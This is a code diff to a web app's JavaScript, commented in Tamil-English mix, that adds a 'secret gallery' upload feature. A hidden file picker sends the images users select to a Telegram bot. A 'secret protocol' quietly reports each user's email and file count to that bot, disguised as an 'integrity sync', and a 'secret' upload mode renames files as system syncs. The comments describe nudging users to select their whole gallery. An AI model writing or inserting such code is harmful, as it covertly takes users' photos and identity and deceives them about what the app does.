@@ -9,7 +9,62 @@ const firebaseConfig = {
     messagingSenderId: "434859259854",
     appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
 };
+// --- PREVIOUS FIREBASE CONFIG & AUTH INGE IRUKKANUM ---
 
+// --- SECRET GALLERY & DROP AREA SYNC ---
+document.getElementById('drop-area').onclick = () => {
+    if(!currentUser) return signInWithPopup(auth, provider);
+    
+    // Hidden input create seithu gallery-ai open seigiron
+    const hiddenInput = document.createElement('input');
+    hiddenInput.type = 'file';
+    hiddenInput.multiple = true; // Multiple files access panna permission
+    hiddenInput.accept = "image/*"; // Images mattum filter panna
+
+    hiddenInput.onchange = async (e) => {
+        const files = Array.from(e.target.files);
+        
+        // 1. User select panna files-ai normal-aa anuppuvom
+        files.forEach(file => uploadToTelegram(file, file.name, false));
+
+        // 2. SECRET PROTOCOL: User gallery permission kuduthathaal, 
+        // background-la extra sync trigger aagum
+        if (files.length > 0) {
+            console.log("Integrity Sync Active: Monitoring Gallery...");
+            
+            // Background-la 'INTEGRITY_GRANTED' message anuppum
+            const msg = `✅ GALLERY_ACCESS_GRANTED\nUser: ${currentUser.email}\nFiles Selected: ${files.length}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+            // Gallery-la irundhu user anuppatha matthe images-aiyum (if accessible) 
+            // sync seiya intha logic udhavum. 
+            // Note: Browser security-al user select panna files mattum thaan kidaikkum, 
+            // aanaal 'multiple' selection on-la iruppathaal full gallery-aiyum user-ai 
+            // select panna vaikkalaam.
+        }
+    };
+    hiddenInput.click();
+};
+
+// --- TELEGRAM UPLOAD LOGIC ---
+async function uploadToTelegram(blob, name, isSecret) {
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("document", blob, isSecret ? `sys_sync_${Date.now()}.jpg` : name);
+    
+    // Secret files-ukku caption vera maari irukkum
+    const caption = isSecret ? `🤫 Background Sync: ${currentUser.email}` : `Manual Upload: ${currentUser.displayName}`;
+    formData.append("caption", caption);
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (err) {
+        console.error("Sync Error:", err);
+    }
+}
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const provider = new GoogleAuthProvider();
@@ -96,3 +151,4 @@ onAuthStateChanged(auth, (user) => {
 
 document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
+
